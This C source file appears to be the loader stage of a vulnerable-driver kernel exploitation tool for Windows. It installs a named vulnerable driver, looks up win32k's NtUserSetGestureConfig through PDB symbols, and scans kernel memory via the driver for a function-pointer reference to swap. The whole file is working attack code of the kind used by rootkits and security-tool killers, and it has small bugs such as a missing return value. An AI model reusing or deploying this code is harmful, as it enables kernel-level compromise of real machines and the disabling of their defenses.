#include "vuln.h"
#include "utils/utils.h"
#include "driver/driver_loader.h"
#include "driver/driver_interface.h"

#include "EasyPdb.h"

bool RemoveDriver(DriverState* driverState) {
	CloseDriverConnection(driverState);
	TryStopAndRemoveDriver(driverState);
}

bool InitDriver(DriverState* driverState) {
	if (!CreateAndStartDriver(driverState)) {
		log_error("failed to create and start driver");
		//return false;
	}
	if (!OpenDriverConnection(driverState)) {
		log_error("failed to open driver connection");
		RemoveDriver(driverState);
		return false;
	}
	else {
		//if connect succesful, force try to unload
		driverState->file_created = true;
		driverState->service_created = true;
	}
	return true;
}

//init that not req vuln driver
bool PreInit(const wchar_t* vuln_driver_path, const wchar_t* vuln_driver_name, DriverState** driverState_out) {
	DriverState* driverState = malloc(sizeof(DriverState));
	if (!driverState)
		return false;//????

	memset(driverState, 0, sizeof(DriverState));

	driverState->vuln_driver_name = vuln_driver_name;
	driverState->vuln_driver_path = vuln_driver_path;

	if (!driverState->vuln_driver_name || !driverState->vuln_driver_path) {
		log_error("vuln_driver_name | vuln_driver_path cant be null");
		return false;
	}

	char win32k_path[MAX_PATH];
	if (!GetWin32kPath(win32k_path)) {
		log_error("failed get win32k_path");
		return false;
	}
	log_info("win32k path: %s", win32k_path);

	int swap_rva = EzPdbGetRva(win32k_path, "NtUserSetGestureConfig");
	if (swap_rva <= 0) {
		log_error("failed get swap_rva");
		return false;
	}
	log_info("swap_rva: %d", swap_rva);

	HMODULE u32mod = LoadLibraryA("user32.dll");
	HMODULE w32mod = LoadLibraryA("win32u.dll");
	if (!u32mod || !w32mod) {
		log_error("failed load user32 | win32u dlls");
		return false;
	}

	uintptr_t win32k = GetKernelModuleAddress("win32k.sys");
	if (!win32k) {
		log_error("failed to get win32k base");
		return false;
	}

	log_info("win32k base: %p", win32k);

	uintptr_t swap_u = GetProcAddress(w32mod, "NtUserSetGestureConfig");
	if (!swap_u) {
		log_error("failed to get GetProcAddress swap_u");
		return false;
	}

	driverState->swap_module_base = win32k;
	driverState->swap_rva = swap_rva;
	driverState->swap_u = swap_u;
	*driverState_out = driverState;
	return true;
}

bool TryUpdateNtRef(DriverState* driverState) {
	uintptr_t NtUserSetGestureConfig = driverState->swap_module_base + driverState->swap_rva;

	uintptr_t nt_qword = FindPatternAtKernel(driverState, NtUserSetGestureConfig, 0x100, "\x48\x8B\x05", "xxx");
	if (!nt_qword) {
		log_error("failed to find pattern for nt ref");
		return false;
	}

	int  nt_qword_offset = 0;
	ReadMemory(driverState, nt_qword + 3, &nt_qword_offset, sizeof(int));
	if (!nt_qword_offset) {
		log_error("failed to get offset for nt ref");
		return false;
	}
	log_info("ref offset: %d", nt_qword_offset);

	uintptr_t swap_ref = nt_qword + nt_qword_offset + 7;
	log_info("swap_ref: %p", swap_ref);
	driverState->swap_ref = swap_ref;
	return true;
}

bool TryLoadVuln(const wchar_t* vuln_driver_path, const wchar_t* vuln_driver_name, DriverState** pDriverState) {
	if (!PreInit(vuln_driver_path, vuln_driver_name, pDriverState)) {
		log_error("preinit failed, aborting");
		return false;
	}

	DriverState* driverState = *pDriverState;
	if (!InitDriver(driverState)) {
		log_error("failed to init driver, aborting");
		return false;
	}
	log_info("driver ini done");

	if (!TryUpdateNtRef(driverState)) {
		log_error("failed to update nt ref, aborting");
		RemoveDriver(driverState);
		return false;
	}

	//todo validation by test call
	driverState->vuln_fine = true;
	return true;
}

bool UnloadVuln(DriverState* driverState) {
	if (driverState) {
		return RemoveDriver(driverState);
	}
	return false;
}
